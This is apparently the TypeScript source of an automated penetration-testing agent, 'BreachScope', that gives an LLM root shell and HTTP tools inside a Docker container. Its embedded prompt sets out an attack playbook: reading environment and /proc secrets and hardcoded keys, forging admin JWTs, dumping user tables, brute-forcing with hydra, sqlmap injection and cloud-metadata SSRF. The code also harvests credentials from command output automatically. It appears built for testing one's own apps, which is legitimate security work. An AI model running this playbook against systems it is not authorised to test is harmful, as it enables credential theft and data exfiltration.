          attack:   { type: "string" },
          target:   { type: "string" },
          result:   { type: "string", enum: ["success", "partial", "failed"] },
          evidence: { type: "string" },
        },
        required: ["attack", "target", "result", "evidence"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "save_credential",
      description: "Save a credential, API key, token, connection string, or secret found anywhere (env, source code, config, git history).",
      parameters: {
        type: "object",
        properties: {
          key:    { type: "string" },
          value:  { type: "string" },
          source: { type: "string", description: "Where it was found: env, /app/.env, source file path, git history, etc." },
        },
        required: ["key", "value", "source"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "add_hypothesis",
      description: "Add a new attack path or hypothesis to investigate.",
      parameters: {
        type: "object",
        properties: {
          hypothesis: { type: "string" },
          priority:   { type: "string", enum: ["critical", "high", "medium", "low"] },
          requires:   { type: "string", description: "What prerequisite is needed (e.g. 'must find JWT secret first')" },
        },
        required: ["hypothesis", "priority"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "save_attack_chain",
      description: "Document a completed or discovered multi-step attack chain. E.g.: 'JWT_SECRET=weak123 in env → forge admin JWT → GET /admin/users → 847 user records dumped'",
      parameters: {
        type: "object",
        properties: {
          chain: { type: "string" },
        },
        required: ["chain"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "exec_cmd",
      description: "Execute any shell command inside the Docker container. You are ROOT. Install tools freely, run nmap, sqlmap, hydra, ffuf, nuclei, connect to databases, read any file. No restrictions whatsoever.",
      parameters: {
        type: "object",
        properties: {
          cmd: {
            type: "array",
            items: { type: "string" },
            description: "Command as array: ['env'] or ['sh', '-c', 'nmap -sV 127.0.0.1']",
          },
          timeout_seconds: {
            type: "number",
            description: "Timeout in seconds. Default 60. Use 300 for apt-get installs, nmap full scans, sqlmap, hydra, nuclei.",
          },
        },
        required: ["cmd"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "http",
      description: "Make an HTTP request to the application or any internal service. No restrictions — any method, any headers, any payload. Use for OWASP testing, SSRF, auth bypass, injection.",
      parameters: {
        type: "object",
        properties: {
          method:  { type: "string", enum: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"] },
          path:    { type: "string", description: "Relative path (/api/users) or full URL for SSRF/internal service testing (http://127.0.0.1:6379/)" },
          headers: { type: "object", description: "Request headers — set Authorization, Content-Type, X-Forwarded-For, etc." },
          body:    { type: "string", description: "Request body for POST/PUT/PATCH" },
        },
        required: ["method", "path"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "get_logs",
      description: "Read container logs. Use AFTER sending attack payloads to catch error messages, stack traces, injection feedback, and crash indicators.",
      parameters: {
        type: "object",
        properties: {
          lines: { type: "number", description: "Number of log lines to fetch. Default 200." },
        },
      },
    },
  },
  {
    type: "function",
    function: {
      name: "web_search",
      description: "Search the internet for exploit techniques, CVE PoCs, HackTricks articles, PayloadsAllTheThings, Exploit-DB, nuclei templates, tool usage examples. USE AGGRESSIVELY — search every time you identify a framework version, CVE, or new attack surface. Examples: 'Express.js 4.18.2 CVE exploit', 'Spring Boot Actuator RCE heapdump password extraction', 'Jinja2 SSTI RCE bypass filter 2024', 'JWT HS256 algorithm confusion attack', 'Redis unauthorized access session hijack'.",
      parameters: {
        type: "object",
        properties: {
          query: { type: "string", description: "Specific query with version numbers, CVE IDs, framework names, exploit techniques" },
        },
        required: ["query"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "crawl_url",
      description: "Fetch full content of a URL. Use for: HackTricks exploit pages, NVD CVE details, PayloadsAllTheThings raw files, Exploit-DB entries, GitHub PoC repos, vendor advisories. Get exact payloads and step-by-step instructions, not just search snippets.",
      parameters: {
        type: "object",
        properties: {
          url: { type: "string" },
        },
        required: ["url"],
      },
    },
  },
];

// ── Main export ───────────────────────────────────────────────────────────────

export async function runSandboxAgent(
  containerId: string,
  containerIP: string,
  appPort: number,
  projectType: ProjectType,
  projectContext: string,
  serviceSubpath: string,
  execFn: ExecFn,
  logsFn: LogsFn
): Promise<SandboxAgentResult> {
  const sessionId = `sandbox-${Date.now()}`;
  const memPath = path.join(os.tmpdir(), `${sessionId}.json`);
  const attackLog: AttackLogEntry[] = [];
  let logStep = 0;
  const baseUrl = `http://${containerIP}:${appPort}`;

  function pushLog(type: AttackLogEntryType, tool: string, input: string, output: string, extras?: { exitCode?: number; status?: number }): void {
    attackLog.push({
      step: ++logStep,
      type,
      tool,
      input: input.slice(0, 300),
      output: output.slice(0, 2000),
      timestamp: new Date().toISOString(),
      ...extras,
    });
  }

  const initialMemory = createMemory(sessionId, baseUrl, projectType);
  saveMemory(memPath, initialMemory);

  logger.debug(`[sandbox-agent] Attack journal: ${memPath}`);

  // ── Tool implementations ──────────────────────────────────────────────────

  function readMemory(): string {
    const mem = loadMemory(memPath);
    return JSON.stringify({
      worldview: mem.worldview,
      target: mem.target_url,
      project_type: mem.project_type,
      open_ports: mem.open_ports,
      credentials_found: Object.keys(mem.credentials).length,
      credential_keys: Object.keys(mem.credentials),
      framework_versions: mem.framework_versions,
      discovered_services: mem.discovered_services,
      discovered_endpoints: mem.discovered_endpoints.slice(0, 60),
      interesting_files: mem.interesting_files,
      installed_tools: mem.installed_tools,
      confirmed_findings: mem.confirmed_findings.length,
      confirmed_severities: mem.confirmed_findings.map((f) => `[${f.severity.toUpperCase()}] ${f.title}`),
      tried_attacks: mem.tried_attacks.slice(-25).map((t) => `${t.result.toUpperCase()} — ${t.attack} → ${t.target}`),
      pending_hypotheses: mem.hypotheses.filter((h) => h.status === "pending").map((h) => `[${h.priority}] ${h.hypothesis}`),
      in_progress_hypotheses: mem.hypotheses.filter((h) => h.status === "in_progress").map((h) => `[${h.priority}] ${h.hypothesis}`),
      attack_chains: mem.attack_chains,
    }, null, 2);
  }

  function updateWorldview(worldview: string): string {
    const mem = loadMemory(memPath);
    mem.worldview = worldview;
    saveMemory(memPath, mem);
    return JSON.stringify({ success: true });
  }

  function saveFinding(title: string, severity: string, description: string, evidence: string, remediation: string): string {
    const mem = loadMemory(memPath);
    const id = `sandbox-${Date.now()}-${mem.confirmed_findings.length}`;
    mem.confirmed_findings.push({
      id, title,
      severity: severity as ConfirmedFinding["severity"],
      category: "code",
      description,
      evidence: evidence.slice(0, 4000),
      remediation,
      timestamp: new Date().toISOString(),
    });
    saveMemory(memPath, mem);
    pushLog("finding", "save_finding", `[${severity.toUpperCase()}] ${title}`, description.slice(0, 500));
    return JSON.stringify({ success: true, id, total_findings: mem.confirmed_findings.length });
  }

  function recordAttempt(attack: string, target: string, result: string, evidence: string): string {
    const mem = loadMemory(memPath);
    mem.tried_attacks.push({
      attack, target,
      result: result as TriedAttack["result"],
      evidence: evidence.slice(0, 500),
      timestamp: new Date().toISOString(),
    });
    const matchedHyp = mem.hypotheses.find(
      (h) => h.status === "pending" && h.hypothesis.toLowerCase().includes(attack.toLowerCase().slice(0, 25))
    );
    if (matchedHyp) {
      if (result === "failed") matchedHyp.status = "abandoned";
      else if (result === "success") matchedHyp.status = "done";
      else matchedHyp.status = "in_progress";
    }
    saveMemory(memPath, mem);
    return JSON.stringify({ success: true });
  }

  function saveCredential(key: string, value: string, source: string): string {
    const mem = loadMemory(memPath);
    mem.credentials[key] = value;
    const lower = key.toLowerCase();
    const addService = (label: string) => {
      if (!mem.discovered_services.find((s) => s.includes(label))) {
        mem.discovered_services.push(`${label} (credentials in ${source})`);
      }
    };
    if (lower.includes("postgres") || lower.includes("pg_") || lower.includes("database_url")) addService("postgresql");
    if (lower.includes("mysql")) addService("mysql");
    if (lower.includes("redis")) addService("redis");
    if (lower.includes("mongo")) addService("mongodb");
    if (lower.includes("elastic")) addService("elasticsearch");
    if (source?.startsWith("/") && !mem.interesting_files.includes(source)) {
      mem.interesting_files.push(source);
    }
    saveMemory(memPath, mem);
    pushLog("credential", "save_credential", key, `Found in: ${source}`);
    return JSON.stringify({ success: true, key, source });
  }

  function addHypothesis(hypothesis: string, priority: string, requires?: string): string {
    const mem = loadMemory(memPath);
    if (mem.hypotheses.find((h) => h.hypothesis.toLowerCase().trim() === hypothesis.toLowerCase().trim())) {
      return JSON.stringify({ success: false, reason: "duplicate" });
    }
    mem.hypotheses.push({
      id: `h-${Date.now()}`,
      hypothesis,
      priority: priority as AttackHypothesis["priority"],
      requires,
      status: "pending",
    });
    saveMemory(memPath, mem);
    return JSON.stringify({ success: true });
  }

  function saveAttackChain(chain: string): string {
    const mem = loadMemory(memPath);
    if (!mem.attack_chains.includes(chain)) mem.attack_chains.push(chain);
    saveMemory(memPath, mem);
    pushLog("chain", "save_attack_chain", chain.slice(0, 300), "Attack chain documented");
    return JSON.stringify({ success: true });
  }

  async function execCmd(cmd: string[], timeoutSeconds = 60): Promise<string> {
    const cmdStr = cmd.join(" ");
    const result = await execFn(cmd, timeoutSeconds * 1000);

    // Auto-record installed tools
    if (/apt-get install|pip install|pip3 install|npm install -g/.test(cmdStr) && result.exitCode === 0) {
      const mem = loadMemory(memPath);
      const toolMatch = cmdStr.match(/install\s+(?:-[a-z]+\s+)*(.+)/);
      if (toolMatch) {
        const tools = (toolMatch[1] ?? "").trim().split(/\s+/).filter((t) => !t.startsWith("-"));
        mem.installed_tools.push(...tools.filter((t) => t.length > 1));
        saveMemory(memPath, mem);
      }
    }

    // Auto-extract open ports from ss/netstat/nmap output
    if (/ss -tlnp|netstat -tlnp|nmap|nc -z/.test(cmdStr) && result.exitCode === 0) {
      const mem = loadMemory(memPath);
      const portMatches = result.stdout.matchAll(/(?:OPEN:|:(\d{2,5})\s|\.(\d{2,5})\s|open\s.*?(\d{2,5})\/)/g);
      const newPorts: number[] = [];
      for (const m of portMatches) {
        const p = parseInt(m[1] ?? m[2] ?? m[3] ?? "0");
        if (p > 0 && p < 65536 && !mem.open_ports.includes(p)) {
          mem.open_ports.push(p);
          newPorts.push(p);
        }
      }
      if (newPorts.length > 0) {
        saveMemory(memPath, mem);
        const out = JSON.stringify({
          stdout: result.stdout.slice(0, 12_000),
          stderr: result.stderr.slice(0, 2_000),
          exit_code: result.exitCode,
          note: `[BreachScope: detected ${newPorts.length} new open port(s): ${newPorts.join(", ")}]`,
        });
        pushLog("exec", "exec_cmd", cmdStr, `exit:${result.exitCode}\n${result.stdout.slice(0, 1500)}`, { exitCode: result.exitCode });
        return out;
      }
    }

    // Auto-extract env vars and credentials
    if ((cmd[0] === "env" || cmdStr.includes("/environ") || cmdStr.includes("cat /proc")) && result.exitCode === 0) {
      const mem = loadMemory(memPath);
      const lines = result.stdout.split("\n");
      let credSaved = 0;
      const SENSITIVE = ["PASSWORD", "SECRET", "KEY", "TOKEN", "URL", "DSN", "URI", "CREDENTIAL", "AUTH",
        "AWS_", "STRIPE_", "OPENAI_", "ANTHROPIC_", "GITHUB_", "DATABASE", "MONGO", "REDIS",
        "ELASTIC", "TWILIO_", "SENDGRID_", "SUPABASE_", "FIREBASE_", "CLERK_", "NEXTAUTH_"];
      for (const line of lines) {
        const eqIdx = line.indexOf("=");
        if (eqIdx < 0) continue;
        const k = line.slice(0, eqIdx).trim();
        const v = line.slice(eqIdx + 1).trim();
        if (!k || !v || k.includes(" ")) continue;
        mem.env_vars[k] = v.length > 300 ? v.slice(0, 300) + "…" : v;
        const kUpper = k.toUpperCase();
        if (SENSITIVE.some((sk) => kUpper.includes(sk))) {
          const isPlaceholder = /your[_-]|example|changeme|placeholder|replace|<.*>|^\*+$|todo/i.test(v);
          if (!isPlaceholder && v.length > 3) {
            if (!mem.credentials[k]) {
              mem.credentials[k] = v;
              credSaved++;
            }
          }
        }
      }
      if (credSaved > 0) {
        saveMemory(memPath, mem);
        const out = JSON.stringify({
          stdout: result.stdout.slice(0, 12_000),
          stderr: result.stderr.slice(0, 2_000),
          exit_code: result.exitCode,
          note: `[BreachScope: auto-extracted ${credSaved} potential credential(s) to memory — use save_credential() for the most important ones]`,
        });
        pushLog("exec", "exec_cmd", cmdStr, `exit:${result.exitCode} | ${credSaved} credential(s) auto-extracted\n${result.stdout.slice(0, 1200)}`, { exitCode: result.exitCode });
        return out;
      }
    }

    const out = JSON.stringify({
      stdout: result.stdout.slice(0, 12_000),
      stderr: result.stderr.slice(0, 2_000),
      exit_code: result.exitCode,
    });
    pushLog("exec", "exec_cmd", cmdStr, `exit:${result.exitCode}\n${result.stdout.slice(0, 1500)}${result.stderr ? "\nSTDERR: " + result.stderr.slice(0, 300) : ""}`, { exitCode: result.exitCode });
    return out;
  }

  async function httpTool(
    method: string,
    reqPath: string,
    headers: Record<string, string> = {},
    body?: string,
  ): Promise<string> {
    const url = reqPath.startsWith("http") ? reqPath : `${baseUrl}${reqPath}`;

    try {
      const resp = await fetch(url, {
        method,
        headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (compatible; BreachScope/2.0)", ...headers },
        body: body ?? undefined,
        signal: AbortSignal.timeout(20_000),
        redirect: "manual",
      });

      const respHeaders: Record<string, string> = {};
      resp.headers.forEach((v, k) => { respHeaders[k] = v; });

      const text = (await resp.text()).slice(0, 8_000);

      // Auto-record 200 endpoints
      if (resp.status === 200 && reqPath.startsWith("/")) {
        const mem = loadMemory(memPath);
        if (!mem.discovered_endpoints.includes(reqPath)) {
          mem.discovered_endpoints.push(reqPath);
          saveMemory(memPath, mem);
        }
      }

      // Auto-extract JWT tokens from response
      const jwtMatch = text.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/);
      const tokenNote = jwtMatch ? `\n[BreachScope: JWT token found in response — consider cracking or forging it]` : "";

      // Auto-extract framework version hints from headers
      const serverHeader = respHeaders["server"] ?? "";
      const poweredBy = respHeaders["x-powered-by"] ?? "";
      if (serverHeader || poweredBy) {
        const mem = loadMemory(memPath);
        if (serverHeader && !mem.framework_versions["server"]) {
          mem.framework_versions["server"] = serverHeader;
          saveMemory(memPath, mem);
        }
        if (poweredBy && !mem.framework_versions["x-powered-by"]) {
          mem.framework_versions["x-powered-by"] = poweredBy;
          saveMemory(memPath, mem);
        }
      }

      const responseOut = JSON.stringify({
        status: resp.status,
        headers: Object.fromEntries(
          Object.entries(respHeaders).filter(([k]) =>
            !["date", "connection", "keep-alive", "transfer-encoding"].includes(k)
          )
        ),
        body: text + tokenNote,
        redirect_location: respHeaders["location"],
      });
      pushLog("http", "http", `${method} ${reqPath}`, `HTTP ${resp.status}\n${text.slice(0, 1500)}`, { status: resp.status });
      return responseOut;
    } catch (e) {
      pushLog("http", "http", `${method} ${reqPath}`, `ERROR: ${String(e)}`);
      return JSON.stringify({ error: String(e), url, note: "App may not be listening — try exec_cmd to start it or explore /app statically" });
    }
  }

  async function getLogsTool(lines = 200): Promise<string> {
    return logsFn(lines);
  }

  // ── Agent loop ────────────────────────────────────────────────────────────

  const serviceHint = serviceSubpath
    ? `MONOREPO TARGET: Service is at /app/${serviceSubpath}/ inside the container.\n  - Source code: /app/${serviceSubpath}/\n  - .env files: check /app/${serviceSubpath}/.env AND /app/.env\n  - Start command: read /app/${serviceSubpath}/package.json or equivalent manifest\n`
    : `Service code is at /app/\n`;

  const contextHint = projectContext
    ? `PRE-ATTACK INTEL AVAILABLE: Codebase was analyzed before this session. You know the real env var names, auth mechanism, database type, framework versions, and endpoint structure. Attack known targets — skip generic blind recon.\n`
    : "";

  const userMessage = `TARGET: ${baseUrl}
PROJECT TYPE: ${projectType}
CONTAINER: ${containerId.slice(0, 12)}
${serviceHint}${contextHint}
YOU ARE ROOT — full access. Install tools. Connect to databases. Read all files.

═══ EXECUTION ORDER ═══════════════════════════════════════════

STEP 1 — SETUP & RECON (first 8 commands):
  1. read_memory()
  2. exec_cmd(["sh","-c","export DEBIAN_FRONTEND=noninteractive && apt-get update -qq && apt-get install -y -q nmap curl wget netcat-openbsd postgresql-client redis-tools jq nikto sqlmap ffuf 2>/dev/null; pip3 install pyjwt 2>/dev/null; echo READY"], 300)
  3. exec_cmd(["env"]) — ALL env vars → save_credential() for every real secret found
  4. exec_cmd(["sh","-c","cat /proc/1/environ | tr '\\0' '\\n'"]) — process env
  5. exec_cmd(["sh","-c","find /app -name '.env*' -o -name 'wrangler.toml' -o -name 'config.yaml' -o -name 'application.yml' -o -name 'appsettings.json' -o -name 'secrets.yml' 2>/dev/null | grep -v node_modules | head -20 | xargs cat 2>/dev/null"]) — ALL secret files
  6. exec_cmd(["sh","-c","for p in 80 443 3000 4000 5000 8000 8080 8443 9000 3306 5432 6379 27017 9200 2181 15672; do nc -z -w1 127.0.0.1 $p 2>/dev/null && echo OPEN:$p; done"]) — port sweep
  7. http("GET", "/") — fingerprint app
  8. exec_cmd(["sh","-c","grep -r 'sk-\\|ghp_\\|npm_\\|AKIA[A-Z0-9]\\|eyJ\\|password\\s*[:=]\\|secret\\s*[:=]\\|api.key' /app 2>/dev/null | grep -v '.git\\|node_modules\\|dist\\|.lock\\|test' | head -40"]) — hardcoded secrets

STEP 2 — EXPLOIT CREDENTIALS IMMEDIATELY:
  For every real credential found:
  - DB_URL / DATABASE_URL → connect immediately → dump users table → save_finding(CRITICAL)
  - JWT_SECRET → forge admin token → test every protected endpoint → save_finding(CRITICAL)
  - REDIS_URL → redis-cli KEYS * → read sessions → save_finding(HIGH)
  - API keys (sk-, AKIA, ghp_) → save_credential() → document what access they give → save_finding(CRITICAL)
  - Any password → try against login endpoint + try against DB directly

  Forge JWT if secret found:
  exec_cmd(["sh","-c","python3 -c \\"import jwt; tok=jwt.encode({'role':'admin','id':1,'is_admin':True,'exp':9999999999},'JWT_SECRET_VALUE',algorithm='HS256'); print(tok)\\""])
  Then: http("GET", "/api/admin") with Authorization: Bearer <forged_token>
  Then: http("GET", "/api/users") with forged token — look for full user data

STEP 3 — ENDPOINT DISCOVERY & FULL APP ATTACK:
  http("GET", "/robots.txt"), http("GET", "/openapi.json"), http("GET", "/swagger.json"), http("GET", "/api-docs"), http("GET", "/graphql")
  exec_cmd(["sh","-c","ffuf -u http://127.0.0.1:${appPort}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403 -t 40 -timeout 3 -c 2>/dev/null | head -50"])
  exec_cmd(["sh","-c","ffuf -u http://127.0.0.1:${appPort}/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403 -t 40 -timeout 3 -c 2>/dev/null | head -30"])
  For every discovered endpoint: test SQLi, XSS, SSTI, auth bypass, IDOR

STEP 4 — INTERNAL SERVICES (for every open port):
  Redis on 6379: exec_cmd(["sh","-c","redis-cli PING && redis-cli KEYS '*' | head -20 && redis-cli INFO server | head -10"])
  Postgres on 5432: connect with creds from env, SELECT * FROM users LIMIT 20
  Mongo on 27017: exec_cmd(["sh","-c","mongosh --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null"])
  Other ports: http requests to http://127.0.0.1:PORT to see what responds

STEP 5 — NUCLEI + NIKTO (automated vuln scan):
  exec_cmd(["sh","-c","nikto -h http://127.0.0.1:${appPort} -maxtime 90 2>/dev/null | grep -E 'OSVDB|CVE|vuln|dangerous|Default|interesting' | head -30"])
  exec_cmd(["sh","-c","nuclei -u http://127.0.0.1:${appPort} -t misconfiguration/ -t exposures/ -t cves/ -silent -timeout 5 2>/dev/null | head -40"]) — if nuclei available

STEP 6 — OWASP TOP 10 THOROUGH SWEEP:
  A1 SQLi: exec_cmd(["sh","-c","sqlmap -u 'http://127.0.0.1:${appPort}/?id=1' --batch --level=2 --risk=2 --dbs --timeout=10 2>/dev/null | tail -20"])
  A2 Auth bypass: test default creds on login, JWT none-alg, brute with hydra
  A3 Secrets: grep -r in /app (done above), check git log for committed secrets
  A5 IDOR: enumerate /api/users/1, /2, /3 — check if unauthed access works
  A6 Misconfig: check /actuator, /.env, /.git/config, /debug, /phpinfo.php, /server-status
  A7 XSS: http("GET", "/search?q=<script>alert(1)</script>") and check reflection
  A10 SSRF: test url/endpoint/callback params with http://169.254.169.254/latest/meta-data

  After every finding: save_finding() with exact command + output as evidence.
  After every attempt (success or fail): record_attempt()
  After every 4 commands: update_worldview()
  After every chain: save_attack_chain()

NEVER output 0 findings if you found real credentials, working exploits, or accessible internal services.
Begin immediately with STEP 1.`;

  let content = "";
  let tokensUsed = 0;

  try {
    const result = await agentLoop(
      {
        system: buildSystemPrompt(projectType, projectContext),
        messages: [{ role: "user", content: userMessage }],
        tools: TOOLS,
        temperature: 0.1,
        maxTokens: 16_000,
        maxIterations: 80,
      },
      async (toolName, args) => {
        logger.debug(`  [sandbox] ${toolName}(${JSON.stringify(args).slice(0, 120)})`);
        const a = args as Record<string, unknown>;

        switch (toolName) {
          case "read_memory":       return readMemory();
          case "update_worldview":  return updateWorldview(String(a["worldview"] ?? ""));
          case "save_finding":      return saveFinding(
            String(a["title"] ?? ""), String(a["severity"] ?? "low"),
            String(a["description"] ?? ""), String(a["evidence"] ?? ""),
            String(a["remediation"] ?? ""),
          );
          case "record_attempt":    return recordAttempt(
            String(a["attack"] ?? ""), String(a["target"] ?? ""),
            String(a["result"] ?? "failed"), String(a["evidence"] ?? ""),
          );
          case "save_credential":   return saveCredential(
            String(a["key"] ?? ""), String(a["value"] ?? ""),
            String(a["source"] ?? "unknown"),
          );
          case "add_hypothesis":    return addHypothesis(
            String(a["hypothesis"] ?? ""), String(a["priority"] ?? "medium"),
            a["requires"] ? String(a["requires"]) : undefined,
          );
          case "save_attack_chain": return saveAttackChain(String(a["chain"] ?? ""));
          case "exec_cmd":          return execCmd(
            a["cmd"] as string[],
            Number(a["timeout_seconds"] ?? 60),
          );
          case "http":              return httpTool(
            String(a["method"] ?? "GET"), String(a["path"] ?? "/"),
            (a["headers"] as Record<string, string> | undefined) ?? {},
            a["body"] ? String(a["body"]) : undefined,
          );
          case "get_logs":          return getLogsTool(Number(a["lines"] ?? 200));
          case "web_search": {
            const query = String(a["query"] ?? "");
            const searchResult = await webSearch(query, 10);
            pushLog("search", "web_search", query, searchResult.slice(0, 1500));
            return searchResult;
          }
          case "crawl_url": {
            const url = String(a["url"] ?? "");
            const crawlResult = await crawlUrl(url);
            pushLog("crawl", "crawl_url", url, crawlResult.slice(0, 1500));
            return crawlResult;
          }
          default: return JSON.stringify({ error: `Unknown tool: ${toolName}` });
        }
      }
    );
    content = result.content;
    tokensUsed = result.tokensUsed;
  } catch (e) {
    logger.error(`Sandbox agent error: ${e}`);
  }

  const mem = loadMemory(memPath);

  // Parse any findings from final JSON output
  let additionalFindings: Finding[] = [];
  try {
    const jsonMatch = content.match(/\[[\s\S]*?\]/);
    if (jsonMatch) {
      const parsed = JSON.parse(jsonMatch[0]) as Array<{
        id?: string; title?: string; severity?: string;
        category?: string; description?: string; remediation?: string; references?: string[];
      }>;
      if (Array.isArray(parsed)) {
        additionalFindings = parsed.map((f) => ({
          id: f.id ?? `sandbox-ai-${Date.now()}`,
          title: f.title ?? "Unknown finding",
          severity: (f.severity ?? "low") as Finding["severity"],
          category: "code" as const,
          description: f.description ?? "",
          remediation: f.remediation,
          references: f.references,
        }));
      }
    }
  } catch { /* memory findings are authoritative */ }

  // Deduplicate memory + AI text output
  const memoryTitles = new Set(mem.confirmed_findings.map((f) => f.title.toLowerCase()));
  const dedupedAdditional = additionalFindings.filter((f) => !memoryTitles.has(f.title.toLowerCase()));

  const memoryFindings: Finding[] = mem.confirmed_findings.map((f) => ({
    id: f.id,
    title: f.title,
    severity: f.severity,
    category: "code" as const,
    description: f.description,
    remediation: f.remediation,
    references: [],
    detail: f.evidence.slice(0, 600),
  }));

  const allFindings = [...memoryFindings, ...dedupedAdditional];

  logger.debug(
    `[sandbox-agent] Complete: ${allFindings.length} findings · ${mem.tried_attacks.length} attacks · ${mem.attack_chains.length} chains · ${tokensUsed.toLocaleString()} tokens`
  );

  return {
    findings: allFindings,
    tokensUsed,
    attackLog,
    attackChains: mem.attack_chains,
    memoryPath: memPath,
  };
}
